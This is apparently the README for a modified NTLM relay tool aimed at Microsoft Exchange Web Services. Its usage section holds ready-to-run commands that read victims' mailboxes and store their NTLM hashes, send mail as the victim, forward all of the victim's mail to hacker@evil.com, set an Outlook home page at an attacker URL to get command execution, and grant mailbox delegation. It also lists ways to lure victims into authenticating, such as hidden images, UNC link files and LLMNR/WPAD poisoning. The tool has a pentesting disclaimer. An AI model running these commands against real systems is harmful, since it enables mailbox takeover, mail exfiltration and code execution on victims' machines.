MsExchangeRelay based on ntlmRelayToEWS
============

Based on ntlmRelayToEWS - Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)

Modified by MISTeam 

**ntlmRelayToEWS** is a tool for performing ntlm relay attacks on Exchange Web Services (EWS). It spawns an SMBListener on port 445 and an HTTPListener on port 80, waiting for incoming connection from the victim. Once the victim connects to one of the listeners, an NTLM negociation occurs and is relayed to the target EWS server.

Obviously this tool does **NOT** implement the whole EWS API, so only a handful of services are implemented that can be useful in some attack scenarios. I might be adding more in the future. See the 'usage' section to get an idea of which EWS calls are being implemented.

Limitations and Improvements
----------------------
**Exchange version**:<br>
I've tested this tool against an **Exchange Server 2010 SP2** only (*which is quite old admitedly*), so all EWS SOAP request templates, as well as the parsing of the EWS responses, are only tested for this version of Exchange.
Although I've not tested myself, some reported this tool is also working against an **Exchange 2016 server**, out of the box (*ie: without any changes to the SOAP request templates*).

Prerequisites
----------------------
**ntlmRelayToEWS** requires a proper/clean install of [Impacket](https://github.com/CoreSecurity/impacket) at least v0.9.17. So follow their instructions to get a working version of Impacket.

Improovements
----------------------
Changed impacket v0.9.15 to v0.9.18. So SMB server works with SMB2 and Windows 10 clients<br>
Added domain filter parameter to SMB server - so U can filter incoming SMB auth requests by used SMB DOMAIN and do not relay wrong request to OWA<br>
Added http OPTIONS and HEAD reply so MS Office user-agent works correctly.<br>
Added failed logins logging<br>
Added date and time to log file<br>
Added download limits<br>

Usage
----------------------
**ntlmRelayToEWS** implements the following attacks, which are all made on behalf of the relayed user (*victim*).

Refer to the help to get additional info: `./ntlmRelayToEWS -h`. Get more debug information using the `--verbose` or `-v` flag.

**getFolder and save NTLM-SSP hash**<br>
Retrieves all items from a predefined folder (*inbox, sent items, calendar, tasks*) and save NTLM-SSL hash (failed and success) to file:<br>
`./ntlmRelayToEWS.py -t https://target.ews.server.corporate.org/EWS/exchange.asmx -r getFolder -f inbox -o out.txt`

**sendMail**<br>
Sends an HTML formed e-mail to a list of destinations:<br>
`./ntlmRelayToEWS.py -t https://target.ews.server.corporate.org/EWS/exchange.asmx -r sendMail -d "user1@corporate.org,user2@corporate.com" -s Subject -m sampleMsg.html`

**forwardRule**<br>
Creates an evil forwarding rule that forwards all incoming message for the victim to another email address:<br>
`./ntlmRelayToEWS.py -t https://target.ews.server.corporate.org/EWS/exchange.asmx -r forwardRule -d hacker@evil.com`

**setHomePage**<br>
Defines a folder home page (*usually for the Inbox folder*) by specifying a URL. This technique, uncovered by SensePost/Etienne Stalmans allows for **arbitray command execution** in the victim's Outlook program by forging a specific HTML page: [Outlook Home Page – Another Ruler Vector](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/):<br>
`./ntlmRelayToEWS.py -t https://target.ews.server.corporate.org/EWS/exchange.asmx -r setHomePage -f inbox -u http://path.to.evil.com/evilpage.html`

**addDelegate**<br>
Sets a delegate address on the victim's primary mailbox. In other words, the victim delegates the control of its mailbox to someone else. Once done, it means the delegated address has full control over the victim's mailbox, by simply opening it as an additional mailbox in Outlook:<br>
`./ntlmRelayToEWS.py -t https://target.ews.server.corporate.org/EWS/exchange.asmx -r addDelegate -d delegated.address@corporate.org`

**Limiting folder download**<br>
Use --limit param to limiting download messages<br>
`./ntlmRelayToEWS.py -v -t https://target.ews.server.corporate.org/EWS/exchange.asmx -r getFolder -f inbox --filter LAB --limit 10 `

**Debug**<br>
When U get problem with connection to EWS - U can use it with proxychains and http proxy server, or U can use -v param<br>
`proxychains ./ntlmRelayToEWS.py -v -t https://target.ews.server.corporate.org/EWS/exchange.asmx -r addDelegate -d delegated.address@corporate.org`

How to get the victim to give you their credentials for relaying ?
----------------------
In order to get the victim to send his credentials to ntlmRelayToEWS you can use any of the following well known methods:
  - Send the victim an e-mail with a hidden picture which 'src' attribute points to the ntlmRelayToEWS server, using either HTTP or SMB. Check the `Invoke-SendEmail.ps1` script to achieve this.
  - Create a link file which 'icon' attribute points to the ntlmRelayToEWS using a UNC path and let victim browse a folder with this link
  - Perform LLMNR, NBNS or WPAD poisonning (*think of Responder.py or Invoke-Inveigh for instance*) to get any corresponding SMB or HTTP trafic from the victim sent to ntlmRelayToEWS
  - other ?

Credits
----------------
Based on [Impacket](https://github.com/CoreSecurity/impacket) and *ntlmrelayx* by Alberto Solino [@agsolino](https://twitter.com/agsolino).
Modified by MISTeam

DISCLAIMER
----------------
This tool is intended to be used in a legal and legitimate way only:
  - either on your own systems as a means of learning, of demonstrating what can be done and how, or testing your defense and detection mechanisms
  - on systems you've been officially and legitimately entitled to perform some security assessments (pentest, security audits)

Quoting Empire's authors:
*There is no way to build offensive tools useful to the legitimate infosec industry while simultaneously preventing malicious actors from abusing them.*
